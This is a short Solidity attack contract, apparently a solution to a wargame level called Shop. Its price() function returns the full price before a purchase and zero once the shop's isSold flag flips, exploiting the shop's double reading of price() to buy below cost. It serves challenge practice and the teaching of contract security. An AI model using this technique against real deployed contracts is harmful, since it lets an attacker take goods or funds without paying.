// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Shop.sol";

contract ShopAttack is Buyer {
    Shop target;

    constructor(address _target) public {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
    }

    function price() external view override returns (uint256) {
        bool s = target.isSold();
        if (s) return 0;
        else return target.price();
    }
}
